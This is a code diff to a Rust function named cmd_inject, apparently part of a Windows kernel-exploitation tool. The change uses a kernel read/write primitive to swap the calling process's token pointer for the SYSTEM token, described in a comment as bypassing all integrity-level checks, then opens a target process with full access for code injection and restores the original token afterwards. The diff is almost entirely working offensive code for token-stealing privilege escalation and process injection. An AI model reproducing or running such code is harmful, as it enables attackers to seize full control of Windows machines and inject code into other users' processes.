@@ -293,12 +293,23 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
     let sys_present = krw.kread(sys_token + TOKEN_SEP_PRESENT)?;
     let sys_enabled = krw.kread(sys_token + TOKEN_SEP_ENABLED)?;
     
-    // We do NOT escalate our_eproc here to ensure the calling process (like explorer.exe)
-    // keeps its normal token, preventing UWP apps from breaking.
+    // Backup our original privileges
+    // Backup our original token pointer
+    let our_token_ptr_addr = walk.our_eproc + EPROC_TOKEN;
+    let our_orig_token_ptr = krw.kread(our_token_ptr_addr)?;
+
+    // Temporarily replace our token pointer with the SYSTEM token pointer
+    // This gives us true SYSTEM identity and bypasses all Integrity Level checks
+    krw.kwrite(our_token_ptr_addr, sys_token_ref)?;
 
     let hproc = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, final_pid as u32) };
+    let err = unsafe { GetLastError() };
+
     if hproc.is_null() {
-        bail!("OpenProcess PID={} WinErr={}", final_pid, unsafe { GetLastError() });
+        // Restore before bailing
+        // Restore before bailing
+        krw.kwrite(our_token_ptr_addr, our_orig_token_ptr).ok();
+        bail!("OpenProcess PID={} WinErr={}", final_pid, err);
     }
     log_debug(&format!("Opened target process handle: {:?}", hproc));
 
@@ -371,6 +382,10 @@ pub fn cmd_inject(dev: &Device, target_pid: Option<u64>) -> Result<()> {
     unsafe { CloseHandle(hthread); }
     unsafe { CloseHandle(hproc); }
 
-    log_debug("cmd_inject finished successfully!");
+    // Restore our original privileges!
+    // Restore our original token pointer!
+    krw.kwrite(our_token_ptr_addr, our_orig_token_ptr)?;
+
+    log_debug("cmd_inject finished successfully, token restored!");
     Ok(())
 }
